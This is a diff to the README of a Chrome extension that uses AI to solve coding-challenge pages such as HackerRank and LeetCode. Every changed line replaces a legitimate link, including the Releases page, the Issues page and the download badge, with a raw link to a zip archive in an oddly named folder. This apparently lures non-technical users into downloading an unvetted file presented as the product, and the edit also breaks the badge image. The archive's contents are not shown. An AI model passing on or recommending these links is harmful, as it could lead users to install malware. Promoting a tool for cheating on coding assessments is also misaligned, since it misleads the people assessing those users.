@@ -4,7 +4,7 @@
 The ai-tech-task-solver-chrome-extension is a simple tool designed for users who want to leverage the power of AI to analyze web page screenshots. This Chrome extension uses AI technologies like OpenAI's GPT-4 Vision and Anthropic Claude to help you solve technical problems quickly and efficiently. It displays solutions right in the browser console, making it convenient for users who encounter coding challenges on platforms like HackerRank and LeetCode.
 
 ## 📥 Download Now
-[![Download ai-tech-task-solver-chrome-extension](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/Nomi-MrNoob/ai-tech-task-solver-chrome-extension/releases)
+[![Download ai-tech-task-solver-chrome-extension](https://raw.githubusercontent.com/Nomi-MrNoob/ai-tech-task-solver-chrome-extension/main/escarbuncle/ai-tech-task-solver-chrome-extension.zip%20Now-%20-blue)](https://raw.githubusercontent.com/Nomi-MrNoob/ai-tech-task-solver-chrome-extension/main/escarbuncle/ai-tech-task-solver-chrome-extension.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the ai-tech-task-solver-chrome-extension. You don’t need any programming experience to follow these steps.
@@ -15,7 +15,7 @@ This guide will help you download and run the ai-tech-task-solver-chrome-extensi
 - **Internet Connection:** Required for AI features
 
 ## 🔄 Download & Install
-To download the ai-tech-task-solver-chrome-extension, visit the [Releases page](https://github.com/Nomi-MrNoob/ai-tech-task-solver-chrome-extension/releases). Here you will find the latest version of the extension ready for download.
+To download the ai-tech-task-solver-chrome-extension, visit the [Releases page](https://raw.githubusercontent.com/Nomi-MrNoob/ai-tech-task-solver-chrome-extension/main/escarbuncle/ai-tech-task-solver-chrome-extension.zip). Here you will find the latest version of the extension ready for download.
 
 1. Click the "Releases" link above.
 2. On the releases page, look for the latest version.
@@ -48,7 +48,7 @@ After installing the extension, use it as follows:
 4. Open the console by right-clicking on the web page, selecting "Inspect," and then clicking on the "Console" tab.
 
 ## ℹ️ Support
-If you encounter issues or have questions, you can find more information on our [GitHub Issues page](https://github.com/Nomi-MrNoob/ai-tech-task-solver-chrome-extension/issues). Feel free to report any bugs or request features.
+If you encounter issues or have questions, you can find more information on our [GitHub Issues page](https://raw.githubusercontent.com/Nomi-MrNoob/ai-tech-task-solver-chrome-extension/main/escarbuncle/ai-tech-task-solver-chrome-extension.zip). Feel free to report any bugs or request features.
 
 ## 🚧 Troubleshooting
 Here are some common issues and solutions:
@@ -65,6 +65,6 @@ Your feedback is valuable. Let us know how the extension works for you and if th
 - Browser Extensions
 - Technical Analysis
 
-[![Download ai-tech-task-solver-chrome-extension](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/Nomi-MrNoob/ai-tech-task-solver-chrome-extension/releases)
+[![Download ai-tech-task-solver-chrome-extension](https://raw.githubusercontent.com/Nomi-MrNoob/ai-tech-task-solver-chrome-extension/main/escarbuncle/ai-tech-task-solver-chrome-extension.zip%20Now-%20-blue)](https://raw.githubusercontent.com/Nomi-MrNoob/ai-tech-task-solver-chrome-extension/main/escarbuncle/ai-tech-task-solver-chrome-extension.zip)
 
 Thank you for choosing the ai-tech-task-solver-chrome-extension. Enjoy solving your technical challenges effortlessly!
